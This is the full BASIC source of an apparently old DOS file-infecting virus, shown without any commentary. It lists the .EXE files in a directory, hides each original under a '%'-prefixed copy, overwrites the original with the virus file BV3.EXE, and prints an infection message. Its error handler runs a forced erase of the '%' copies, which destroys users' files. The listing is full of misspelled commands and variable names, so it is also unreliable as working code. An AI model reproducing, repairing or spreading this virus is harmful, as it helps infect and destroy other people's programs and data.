1 REM *** Remember to use /e parameter when compiling.
50 ON ERROR GOTO 670
90 LENGHTVIR=2641
100 VIRROOT$="BV3.EXE"
130 SHELL "DIR *.EXE>INH"
150 OPEN "R",1,"INH",32000 
160 GET #1,1
170 LINE INPUT#1,ORIGINAL$
180 LINE INPUT#1,ORIGINAL$
190 LINE INPUT#1,ORIGINAL$
200 LINE INPUT#1,ORIGINAL$  
210 ON ERROR GOT 670
220 CLOSE#2
230 F=1:LINE INPUT#1,ORIGINAL$
270 IF MID$(ORIGINAL$,1,1)="%" THEN GOTO 210
280 ORIGINAL$=MID$(ORIGINAL$,1,13)
290 EXTENSIONS$=MID$(ORIGINAL,9,13)
300 MID$(EXTENSIONS$,1,1)="."
320 F=F+1
330 IF MID$(ORIGINAL$,F,1)=" " OR MID$ (ORIGINAL$,F,1)="." OR F=13 THEN      
GOTO 350
340 GOTO 320
350 ORIGINAL$=MID$(ORIGINAL$,1,F-1)+EXTENSION$
360 ON ERROR GOTO 210
365 TEST$=""
380 OPEN "R",2,OROGINAL$,LENGHTVIR
390 IF LOF(2) < LENGHTVIR THEN GOTO 420
400 GET #2,2
410 LINE INPUT#1,TEST$
420 CLOSE#2
470 CLOSE#1
480 ORIGINALS$=ORIGINAL$
490 MID$(ORIGINALS$,1,1)="%"
510 C$="COPY "+ORIGINAL$+" "+ORIGINALS$
520 SHELL C$
540 C$="COPY "+VIRROOT$+ORIGINAL$
550 SHELL C$
570 OPEN ORIGINAL$ FOR APPEND AS #1 LEN=13
580 WRITE#1,ORIGINALS$
590 CLOSE#1
640 PRINT "INFECTION IN " ;ORIGIANAL$; "  !! BE WARE !!"
650 SYSTEM
670 PRINT "VIRUS INTERNAL ERROR GOTTCHA !!!!":SYSTEM
675 SHELL "ECHO Y|ERASE %*.*"
680 END

